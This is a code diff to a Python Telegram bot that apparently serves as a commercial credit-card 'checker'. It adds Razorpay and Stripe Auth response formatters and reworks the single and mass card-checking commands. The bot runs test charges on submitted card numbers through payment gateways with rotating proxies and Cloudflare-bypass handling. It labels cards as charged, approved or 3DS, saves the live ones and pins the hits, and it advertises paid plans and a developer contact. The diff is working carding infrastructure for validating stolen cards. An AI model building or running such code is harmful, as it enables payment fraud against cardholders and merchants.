@@ -741,6 +741,103 @@ def get_msh_status_flag(raw_response):
     else:
         return "Declined ❌"
 
+def format_razorpay_response(card_str, response_data, bin_info, elapsed_time, username, user_id):
+    brand, bin_type, level, bank, country, flag = bin_info
+    response_text = response_data.get("Response", "-")
+    gateway = response_data.get("Gateway", "Razorpay")
+    price = response_data.get("Price", "-")
+    status_raw = response_data.get("Status", "")
+
+    resp_upper = str(response_text).upper()
+    stat_upper = str(status_raw).upper()
+
+    if any(kw in stat_upper for kw in ["CHARGED", "SUCCESS", "CAPTURED", "AUTHORIZED"]):
+        status_flag = "Charged 💎"
+        is_charged = True
+    elif any(kw in resp_upper for kw in ["INSUFFICIENT", "INSUFFICIENT_FUNDS"]) or "INSUFFICIENT" in stat_upper:
+        status_flag = "Approved ❎"
+        is_charged = False
+    elif "CLOUDFLARE" in resp_upper:
+        status_flag = "Cloudflare Spotted ⚠️"
+        is_charged = False
+    else:
+        status_flag = "Declined ❌"
+        is_charged = False
+
+    profile = f"<a href='tg://user?id={user_id}'>{username}</a>"
+    cc_bin = card_str.split("|")[0][:6] if "|" in card_str else card_str[:6]
+
+    msg = (
+        f"<b>[#Razorpay] | Sync</b> ✦\n"
+        f"━━━━━━━━━━━━━━━\n"
+        f"<b>[•] Card</b>- <code>{card_str}</code>\n"
+        f"<b>[•] Gateway</b> - <b>{gateway}</b>\n"
+        f"<b>[•] Status</b>- <code>{status_flag}</code>\n"
+        f"<b>[•] Response</b>- <code>{response_text}</code>\n"
+        f"━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n"
+        f"<b>[+] Bin</b>: <code>{cc_bin}</code>\n"
+        f"<b>[+] Info</b>: <code>{brand} - {bin_type} - {level}</code>\n"
+        f"<b>[+] Bank</b>: <code>{bank}</code> 🏦\n"
+        f"<b>[+] Country</b>: <code>{country} - [{flag}]</code>\n"
+        f"━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n"
+        f"<b>[ﾒ] Checked By</b>: {profile}\n"
+        f"<b>[ϟ] Dev</b> ➺ <a href=\"https://t.me/itzspooooky\">𝙎𝙮𝙣𝙘𝙜𝙖𝙮</a>\n"
+        f"━━━━━━━━━━━━━━━\n"
+        f"<b>[ﾒ] T/t</b>: <code>[{elapsed_time} 𝐬]</code> <b>|P/x:</b> [<code>Live ⚡️</code>]"
+    )
+
+    return status_flag, is_charged, msg
+
+def format_stripe_auth_response(card_str, response_data, bin_info, elapsed_time, username, user_id):
+    brand, bin_type, level, bank, country, flag = bin_info
+    response_text = response_data.get("Response", "-")
+    gateway = response_data.get("Gateway", "Stripe Auth")
+    price = response_data.get("Price", "-")
+    status_raw = response_data.get("Status", "")
+
+    resp_upper = str(response_text).upper()
+    stat_upper = str(status_raw).upper()
+
+    if "REQUIRES_ACTION" in resp_upper or "REQUIRES_ACTION" in stat_upper:
+        status_flag = "3DS ✅"
+        is_charged = True
+    elif "APPROVED" in stat_upper or "SUCCEEDED" in resp_upper:
+        status_flag = "Approved 💎"
+        is_charged = True
+    elif any(kw in resp_upper for kw in ["INSUFFICIENT", "INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS"]):
+        status_flag = "Approved ✅ (Insufficient)"
+        is_charged = True
+    elif "CLOUDFLARE" in resp_upper:
+        status_flag = "Cloudflare Spotted ⚠️"
+        is_charged = False
+    else:
+        status_flag = "Declined ❌"
+        is_charged = False
+
+    profile = f"<a href='tg://user?id={user_id}'>{username}</a>"
+    cc_bin = card_str.split("|")[0][:6] if "|" in card_str else card_str[:6]
+
+    msg = (
+        f"<b>[#StripeAuth] | Sync</b> ✦\n"
+        f"━━━━━━━━━━━━━━━\n"
+        f"<b>[•] Card</b>- <code>{card_str}</code>\n"
+        f"<b>[•] Gateway</b> - <b>{gateway}</b>\n"
+        f"<b>[•] Status</b>- <code>{status_flag}</code>\n"
+        f"<b>[•] Response</b>- <code>{response_text}</code>\n"
+        f"━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n"
+        f"<b>[+] Bin</b>: <code>{cc_bin}</code>\n"
+        f"<b>[+] Info</b>: <code>{brand} - {bin_type} - {level}</code>\n"
+        f"<b>[+] Bank</b>: <code>{bank}</code> 🏦\n"
+        f"<b>[+] Country</b>: <code>{country} - [{flag}]</code>\n"
+        f"━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n"
+        f"<b>[ﾒ] Checked By</b>: {profile}\n"
+        f"<b>[ϟ] Dev</b> ➺ <a href=\"https://t.me/itzspooooky\">𝙎𝙮𝙣𝙘𝙜𝙖𝙮</a>\n"
+        f"━━━━━━━━━━━━━━━\n"
+        f"<b>[ﾒ] T/t</b>: <code>[{elapsed_time} 𝐬]</code> <b>|P/x:</b> [<code>Live ⚡️</code>]"
+    )
+
+    return status_flag, is_charged, msg
+
 async def is_registered_user(user_id):
     """Check if user is registered (has sites, premium, or in free_users)"""
     sites = await load_json(SITE_FILE)
@@ -1016,12 +1113,16 @@ async def check_card_razorpay(card, amount="1", user_id=None):
         
         # Check if exception was returned
         if isinstance(res, Exception):
-            error_str = str(res)
-            if 'proxy' in error_str.lower() and user_id:
-                if proxy_data:
-                    await remove_dead_proxy(user_id, proxy_data.get('proxy_url'))
+            error_str = str(res).lower()
+            proxy_dead_indicators = [
+                'proxyerror', 'proxyconnectionerror', 'cannot connect to proxy',
+                'proxy authentication', 'tunnel connection failed',
+                'socks5', 'socks4', 'httpsconnectionpool'
+            ]
+            if any(ind in error_str for ind in proxy_dead_indicators) and user_id and proxy_data:
+                await remove_dead_proxy(user_id, proxy_data.get('proxy_url'))
                 return {"Response": "⚠️ Proxy is dead and has been removed! Please add a new proxy using /addpxy", "Price": "-", "Gateway": f"Razorpay ₹{amount}", "Status": "Proxy Dead"}
-            return {"Response": "Connection Error", "Price": "-", "Gateway": f"Razorpay ₹{amount}"}
+            return {"Response": f"Connection Error: {str(res)[:100]}", "Price": "-", "Gateway": f"Razorpay ₹{amount}"}
 
         if res.status_code != 200:
             error_text = res.text
@@ -3537,16 +3638,20 @@ async def process_rzp_card(event, access_type):
                 return await event.reply("𝙉𝙤 𝙘𝙖𝙧𝙙 𝙛𝙤𝙪𝙣𝙙 𝙞𝙣 𝙢𝙚𝙨𝙨𝙖𝙜𝙚")
             return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩 ➜ /rzp 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙘𝙧𝙚𝙙𝙞𝙩 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤", parse_mode="markdown")
 
-    loading_msg = await event.reply("🍳")
+    loading_msg = await event.reply("<pre>[$rzp] | Processing..!</pre>", parse_mode='html')
     start_time = time.time()
 
     async def animate_loading():
-        emojis = ["🍳", "🍳🍳", "🍳🍳🍳", "🍳🍳🍳🍳", "🍳🍳🍳🍳🍳"]
+        frames = [
+            "<pre>[$rzp] | Processing.</pre>",
+            "<pre>[$rzp] | Processing..</pre>",
+            "<pre>[$rzp] | Processing..!</pre>"
+        ]
         i = 0
         while True:
             try:
-                await loading_msg.edit(emojis[i % 5])
-                await asyncio.sleep(0.5)
+                await loading_msg.edit(frames[i % 3], parse_mode='html')
+                await asyncio.sleep(1)
                 i += 1
             except: 
                 break
@@ -3558,49 +3663,29 @@ async def process_rzp_card(event, access_type):
         loading_task.cancel()
         end_time = time.time()
         elapsed_time = round(end_time - start_time, 2)
-        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
-        response_text = res.get("Response", "").lower()
-        status_text = res.get("Status", "").lower()
+        bin_info = await get_bin_info(card.split("|")[0])
 
-        # Check for Razorpay status
-        # Status field contains: "Charged" for success, or reason for declined
-        is_charged = False
-        if any(x in status_text for x in ["charged", "success", "captured", "authorized"]):
-            status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
-            status_result = "Charged"
-            is_charged = True
-            await save_approved_card(card, status_result, res.get('Response'), res.get('Gateway'), res.get('Price'))
-        elif "insufficient" in status_text or "insufficient" in response_text:
-            status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
-            status_result = "Approved"
+        status_flag, is_charged, msg = format_razorpay_response(
+            card, res, bin_info, elapsed_time, username, event.sender_id
+        )
+
+        if is_charged:
+            await save_approved_card(card, "Charged", res.get('Response'), res.get('Gateway'), res.get('Price'))
+        elif "Approved" in status_flag:
             await save_approved_card(card, "APPROVED", res.get('Response'), res.get('Gateway'), res.get('Price'))
-        elif "cloudflare bypass failed" in response_text:
-            status_header = "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
-            res["Response"] = "Cloudflare spotted 🤡 change site or try again"
-        else:
-            status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
-            status_result = "Declined"
 
-        msg = f"""{status_header}
-
-𝗖𝗖 ⇾ `{card}`
-𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ {res.get('Gateway', 'Razorpay ₹1')}
-𝗥𝗲𝘀𝗽𝙤𝙣𝙨𝗲 ⇾ {res.get('Response')}
-
-```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
-𝗕𝗮𝗻𝗸: {bank}
-𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```
-
-𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨"""
+        buttons = [
+            [Button.url("Support", "https://t.me/itzspooooky"),
+             Button.inline("Plans", b"plans_info")]
+        ]
 
         await loading_msg.delete()
-        result_msg = await event.reply(msg)
-        if is_charged: 
-            await pin_charged_message(event, result_msg)
+        result_msg = await event.reply(msg, parse_mode='html', buttons=buttons, link_preview=False)
+        if is_charged: await pin_charged_message(event, result_msg)
     except Exception as e:
         loading_task.cancel()
         await loading_msg.delete()
-        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")
+        await event.reply(f"<code>Internal Error Occurred. Try again later.</code>\n<code>{e}</code>", parse_mode='html')
 
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/.]mrzp(?:\s|$)'))
@@ -3639,25 +3724,35 @@ async def mrzp(event):
     asyncio.create_task(process_mrzp_cards(event, cards))
 
 async def process_mrzp_cards(event, cards):
-    # Get username
     try:
         sender = await event.get_sender()
-        username = sender.username if sender.username else f"user_{event.sender_id}"
+        username = sender.first_name if sender.first_name else f"user_{event.sender_id}"
     except:
         username = f"user_{event.sender_id}"
 
-    # Get all user proxies for rotation
+    checked_by = f"<a href='tg://user?id={event.sender_id}'>{username}</a>"
+    card_count = len(cards)
+
+    loader_msg = await event.reply(
+        f"<pre>\u2726 [$mrzp] | M-Razorpay</pre>\n"
+        f"<b>[\u26ac] Gateway -</b> <b>Razorpay</b>\n"
+        f"<b>[\u26ac] CC Amount : {card_count}</b>\n"
+        f"<b>[\u26ac] Checked By :</b> {checked_by}\n"
+        f"<b>[\u26ac] Status :</b> <code>Processing Request..!</code>",
+        parse_mode='html'
+    )
+
     user_proxies = await get_all_user_proxies(event.sender_id)
     proxy_index = 0
 
-    sent_msg = await event.reply(f"```𝙍𝙖𝙯𝙤𝙧𝙥𝙖𝙮 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 🍳 {len(cards)} 𝙏𝙤𝙩𝙖𝙡.```")
+    start_time = time.time()
+    batch_size = 5
+    final_results = []
 
-    batch_size = 5  # Reduced batch size for proxy rotation
     for i in range(0, len(cards), batch_size):
         batch = cards[i:i+batch_size]
         tasks = []
         for card in batch:
-            # Rotate proxy for each card
             if user_proxies:
                 proxy_data = user_proxies[proxy_index % len(user_proxies)]
                 tasks.append(check_card_razorpay_with_proxy(card, proxy_data))
@@ -3666,52 +3761,61 @@ async def process_mrzp_cards(event, cards):
                 tasks.append(check_card_razorpay(card, user_id=event.sender_id))
         results = await asyncio.gather(*tasks, return_exceptions=True)
 
-        for j, (card, result) in enumerate(zip(batch, results)):
-            if isinstance(result, Exception):
-                result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "Razorpay"}
+        for card_item, raw_response in zip(batch, results):
+            if isinstance(raw_response, Exception):
+                raw_response = {"Response": str(raw_response), "Price": "-", "Gateway": "Razorpay"}
 
-            start_time = time.time()
-            end_time = time.time()
-            elapsed_time = round(end_time - start_time, 2)
-            brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
-            response_text = result.get("Response", "").lower()
-            status_text = result.get("Status", "").lower()
+            response_text = raw_response.get("Response", "-") if isinstance(raw_response, dict) else str(raw_response)
+            status_raw = raw_response.get("Status", "") if isinstance(raw_response, dict) else ""
+            stat_upper = str(status_raw).upper()
+            resp_upper = str(response_text).upper()
 
-            # Check for Razorpay status
-            is_charged = False
-            if any(x in status_text for x in ["charged", "success", "captured", "authorized"]):
-                status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
-                status_result = "Charged"
-                is_charged = True
-                await save_approved_card(card, status_result, result.get('Response'), result.get('Gateway'), result.get('Price'))
-            elif "insufficient" in status_text or "insufficient" in response_text:
-                status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
-                status_result = "Approved"
-                await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
-            elif "cloudflare bypass failed" in response_text:
-                status_header = "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
-                result["Response"] = "Cloudflare spotted 🤡 change site or try again"
+            if any(kw in stat_upper for kw in ["CHARGED", "SUCCESS", "CAPTURED", "AUTHORIZED"]):
+                sf = "Charged \U0001f48e"
+                await save_approved_card(card_item, "Charged", response_text, "Razorpay", "-")
+            elif "INSUFFICIENT" in stat_upper or "INSUFFICIENT" in resp_upper:
+                sf = "Approved \u2714\ufe0f"
+                await save_approved_card(card_item, "APPROVED", response_text, "Razorpay", "-")
             else:
-                status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
-                status_result = "Declined"
+                sf = "Declined \u274c"
 
-            card_msg = f"""{status_header}
+            final_results.append(
+                f"\u2022 <b>Card :</b> <code>{card_item}</code>\n"
+                f"\u2022 <b>Status :</b> <code>{sf}</code>\n"
+                f"\u2022 <b>Result :</b> <code>{response_text or '-'}</code>\n"
+                "\u2501 \u2501 \u2501 \u2501 \u2501 \u2501\u2501\u2501 \u2501 \u2501 \u2501 \u2501 \u2501"
+            )
 
-𝗖𝗖 ⇾ `{card}`
-𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ {result.get('Gateway', 'Razorpay ₹1')}
-𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {result.get('Response')}
+        try:
+            await loader_msg.edit(
+                f"<pre>\u2726 [$mrzp] | M-Razorpay</pre>\n"
+                + "\n".join(final_results) + "\n"
+                f"<b>[\u26ac] Checked By :</b> {checked_by}\n"
+                f"<b>[\u26ac] Dev :</b> <a href='https://t.me/itzspooooky'>\U0001d668\U0001d66e\U0001d667\U0001d658\U0001d660\U0001d656\U0001d66e</a>",
+                parse_mode='html', link_preview=False
+            )
+        except Exception:
+            pass
 
-```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
-𝗕𝗮𝗻𝗸: {bank}
-𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```
+    end_time = time.time()
+    timetaken = round(end_time - start_time, 2)
 
-𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨"""
-            result_msg = await event.reply(card_msg)
-            if is_charged: 
-                await pin_charged_message(event, result_msg)
-            await asyncio.sleep(0.1)
-
-    await sent_msg.edit(f"```✅ 𝙍𝙖𝙯𝙤𝙧𝙥𝙖𝙮 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚! 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙 {len(cards)} 𝙘𝙖𝙧𝙙𝙨.```")
+    final_result_text = "\n".join(final_results)
+    try:
+        await loader_msg.edit(
+            f"<pre>\u2726 [$mrzp] | M-Razorpay</pre>\n"
+            f"{final_result_text}\n"
+            f"<b>[\u26ac] T/t :</b> <code>{timetaken}s</code>\n"
+            f"<b>[\u26ac] Checked By :</b> {checked_by}\n"
+            f"<b>[\u26ac] Dev :</b> <a href='https://t.me/itzspooooky'>\U0001d668\U0001d66e\U0001d667\U0001d658\U0001d660\U0001d656\U0001d66e</a>",
+            parse_mode='html', link_preview=False
+        )
+    except Exception:
+        await event.reply(
+            f"<pre>\u2726 [$mrzp] | Complete \u2714\ufe0f</pre>\n"
+            f"<b>Processed {card_count} cards in {timetaken}s</b>",
+            parse_mode='html'
+        )
 
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/.]rztxt(?:\s|$)'))
@@ -3957,16 +4061,20 @@ async def process_au_card(event, access_type):
                 return await event.reply("𝙉𝙤 𝙘𝙖𝙧𝙙 𝙛𝙤𝙪𝙣𝙙 𝙞𝙣 𝙢𝙚𝙨𝙨𝙖𝙜𝙚")
             return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩 ➜ /au 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙘𝙧𝙚𝙙𝙞𝙩 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤", parse_mode="markdown")
 
-    loading_msg = await event.reply("🍳")
+    loading_msg = await event.reply("<pre>[$au] | Processing..!</pre>", parse_mode='html')
     start_time = time.time()
 
     async def animate_loading():
-        emojis = ["🍳", "🍳🍳", "🍳🍳🍳", "🍳🍳🍳🍳", "🍳🍳🍳🍳🍳"]
+        frames = [
+            "<pre>[$au] | Processing.</pre>",
+            "<pre>[$au] | Processing..</pre>",
+            "<pre>[$au] | Processing..!</pre>"
+        ]
         i = 0
         while True:
             try:
-                await loading_msg.edit(emojis[i % 5])
-                await asyncio.sleep(0.5)
+                await loading_msg.edit(frames[i % 3], parse_mode='html')
+                await asyncio.sleep(1)
                 i += 1
             except: 
                 break
@@ -3978,58 +4086,27 @@ async def process_au_card(event, access_type):
         loading_task.cancel()
         end_time = time.time()
         elapsed_time = round(end_time - start_time, 2)
-        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
-        response_text = res.get("Response", "").lower()
-        status_text = res.get("Status", "").lower()
+        bin_info = await get_bin_info(card.split("|")[0])
 
-        # Check for Stripe Auth status using API's 'status' field
-        is_charged = False
-        # Use status_text (from API's 'status' field: Approved/Declined) to determine status
-        # Also check response_text for "Succeeded"
-        # IMPORTANT: Check requires_action FIRST before approved
-        if "requires_action" in response_text or "requires_action" in status_text:
-            status_header = "𝟯𝘿𝙎 ✅"
-            status_result = "3DS Required"
-            is_charged = True
-            await save_approved_card(card, status_result, res.get('Response'), res.get('Gateway'), res.get('Price'))
-        elif "approved" in status_text or "succeeded" in response_text:
-            status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 💎"
-            status_result = "Approved"
-            is_charged = True
-            await save_approved_card(card, status_result, res.get('Response'), res.get('Gateway'), res.get('Price'))
-        elif "insufficient" in response_text or "insufficient funds" in response_text:
-            status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
-            status_result = "Approved (Insufficient Funds)"
-            is_charged = True
-            await save_approved_card(card, status_result, res.get('Response'), res.get('Gateway'), res.get('Price'))
-        elif "cloudflare bypass failed" in response_text:
-            status_header = " 𝙇𝙊𝙐     𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
-            res["Response"] = "Cloudflare spotted 🤡 change site or try again"
-        else:
-            status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
-            status_result = "Declined"
+        status_flag, is_charged, msg = format_stripe_auth_response(
+            card, res, bin_info, elapsed_time, username, event.sender_id
+        )
 
+        if is_charged:
+            await save_approved_card(card, status_flag, res.get('Response'), res.get('Gateway'), res.get('Price'))
 
-        msg = f"""{status_header}
-
-𝗖𝗖 ⇾ `{card}`
-𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ {res.get('Gateway', 'Stripe Auth')}
-𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {res.get('Response')}
-
-```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
-𝗕𝗮𝗻𝗸: {bank}
-𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```
-
-𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝙙𝙨"""
+        buttons = [
+            [Button.url("Support", "https://t.me/itzspooooky"),
+             Button.inline("Plans", b"plans_info")]
+        ]
 
         await loading_msg.delete()
-        result_msg = await event.reply(msg)
-        if is_charged: 
-            await pin_charged_message(event, result_msg)
+        result_msg = await event.reply(msg, parse_mode='html', buttons=buttons, link_preview=False)
+        if is_charged: await pin_charged_message(event, result_msg)
     except Exception as e:
         loading_task.cancel()
         await loading_msg.delete()
-        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")
+        await event.reply(f"<code>Internal Error Occurred. Try again later.</code>\n<code>{e}</code>", parse_mode='html')
 
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/.]mau(?:\s|$)'))
@@ -4068,74 +4145,91 @@ async def mau(event):
     asyncio.create_task(process_mau_cards(event, cards))
 
 async def process_mau_cards(event, cards):
-    # Get username
     try:
         sender = await event.get_sender()
-        username = sender.username if sender.username else f"user_{event.sender_id}"
+        username = sender.first_name if sender.first_name else f"user_{event.sender_id}"
     except:
         username = f"user_{event.sender_id}"
 
-    sent_msg = await event.reply(f"```𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 🍳 {len(cards)} 𝙏𝙤𝙩𝙖𝙡.```")
+    checked_by = f"<a href='tg://user?id={event.sender_id}'>{username}</a>"
+    card_count = len(cards)
 
+    loader_msg = await event.reply(
+        f"<pre>\u2726 [$mau] | M-Stripe Auth</pre>\n"
+        f"<b>[\u26ac] Gateway -</b> <b>Stripe Auth</b>\n"
+        f"<b>[\u26ac] CC Amount : {card_count}</b>\n"
+        f"<b>[\u26ac] Checked By :</b> {checked_by}\n"
+        f"<b>[\u26ac] Status :</b> <code>Processing Request..!</code>",
+        parse_mode='html'
+    )
+
+    start_time = time.time()
     batch_size = 10
+    final_results = []
+
     for i in range(0, len(cards), batch_size):
         batch = cards[i:i+batch_size]
         tasks = [check_card_stripe_auth(card) for card in batch]
         results = await asyncio.gather(*tasks, return_exceptions=True)
 
-        for j, (card, result) in enumerate(zip(batch, results)):
-            if isinstance(result, Exception):
-                result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "Stripe Auth"}
+        for card_item, raw_response in zip(batch, results):
+            if isinstance(raw_response, Exception):
+                raw_response = {"Response": str(raw_response), "Price": "-", "Gateway": "Stripe Auth"}
 
-            start_time = time.time()
-            end_time = time.time()
-            elapsed_time = round(end_time - start_time, 2)
-            brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
-            response_text = result.get("Response", "").lower()
-            status_text = result.get("Status", "").lower()
+            response_text = raw_response.get("Response", "-") if isinstance(raw_response, dict) else str(raw_response)
+            status_raw = raw_response.get("Status", "") if isinstance(raw_response, dict) else ""
+            resp_upper = str(response_text).upper()
+            stat_upper = str(status_raw).upper()
 
-            # Check for Stripe Auth status using API's 'status' field
-            is_charged = False
-            # IMPORTANT: Check requires_action FIRST before approved
-            if "requires_action" in response_text or "requires_action" in status_text:
-                status_header = "𝟯𝘿𝙎 ✅"
-                status_result = "3DS Required"
-                is_charged = True
-                await save_approved_card(card, status_result, result.get('Response'), result.get('Gateway'), result.get('Price'))
-            elif "approved" in status_text or "succeeded" in response_text:
-                status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 💎"
-                status_result = "Approved"
-                is_charged = True
-                await save_approved_card(card, status_result, result.get('Response'), result.get('Gateway'), result.get('Price'))
-            elif "insufficient" in response_text or "insufficient funds" in response_text:
-                status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
-                status_result = "Approved (Insufficient Funds)"
-                is_charged = True
-                await save_approved_card(card, status_result, result.get('Response'), result.get('Gateway'), result.get('Price'))
-            elif "cloudflare bypass failed" in response_text:
-                status_header = "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
-                result["Response"] = "Cloudflare spotted 🤡 change site or try again"
+            if "REQUIRES_ACTION" in resp_upper or "REQUIRES_ACTION" in stat_upper:
+                sf = "3DS \u2705"
+                await save_approved_card(card_item, "3DS", response_text, "Stripe Auth", "-")
+            elif "APPROVED" in stat_upper or "SUCCEEDED" in resp_upper:
+                sf = "Approved \U0001f48e"
+                await save_approved_card(card_item, "Approved", response_text, "Stripe Auth", "-")
+            elif "INSUFFICIENT" in resp_upper:
+                sf = "Approved \u2705"
+                await save_approved_card(card_item, "Approved", response_text, "Stripe Auth", "-")
             else:
-                status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
-                status_result = "Declined"
+                sf = "Declined \u274c"
 
-            card_msg = f"""{status_header}
+            final_results.append(
+                f"\u2022 <b>Card :</b> <code>{card_item}</code>\n"
+                f"\u2022 <b>Status :</b> <code>{sf}</code>\n"
+                f"\u2022 <b>Result :</b> <code>{response_text or '-'}</code>\n"
+                "\u2501 \u2501 \u2501 \u2501 \u2501 \u2501\u2501\u2501 \u2501 \u2501 \u2501 \u2501 \u2501"
+            )
 
-𝗖𝗖 ⇾ `{card}`
-𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ {result.get('Gateway', 'Stripe Auth')}
-𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {result.get('Response')}
+        try:
+            await loader_msg.edit(
+                f"<pre>\u2726 [$mau] | M-Stripe Auth</pre>\n"
+                + "\n".join(final_results) + "\n"
+                f"<b>[\u26ac] Checked By :</b> {checked_by}\n"
+                f"<b>[\u26ac] Dev :</b> <a href='https://t.me/itzspooooky'>\U0001d668\U0001d66e\U0001d667\U0001d658\U0001d660\U0001d656\U0001d66e</a>",
+                parse_mode='html', link_preview=False
+            )
+        except Exception:
+            pass
 
-```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
-𝗕𝗮𝗻𝗸: {bank}
-𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```
+    end_time = time.time()
+    timetaken = round(end_time - start_time, 2)
 
-𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨"""
-            result_msg = await event.reply(card_msg)
-            if is_charged: 
-                await pin_charged_message(event, result_msg)
-            await asyncio.sleep(0.1)
-
-    await sent_msg.edit(f"```✅ 𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚! 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙 {len(cards)} 𝙘𝙖𝙧𝙙𝙨.```")
+    final_result_text = "\n".join(final_results)
+    try:
+        await loader_msg.edit(
+            f"<pre>\u2726 [$mau] | M-Stripe Auth</pre>\n"
+            f"{final_result_text}\n"
+            f"<b>[\u26ac] T/t :</b> <code>{timetaken}s</code>\n"
+            f"<b>[\u26ac] Checked By :</b> {checked_by}\n"
+            f"<b>[\u26ac] Dev :</b> <a href='https://t.me/itzspooooky'>\U0001d668\U0001d66e\U0001d667\U0001d658\U0001d660\U0001d656\U0001d66e</a>",
+            parse_mode='html', link_preview=False
+        )
+    except Exception:
+        await event.reply(
+            f"<pre>\u2726 [$mau] | Complete \u2714\ufe0f</pre>\n"
+            f"<b>Processed {card_count} cards in {timetaken}s</b>",
+            parse_mode='html'
+        )
 
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/.]autxt(?:\s|$)'))
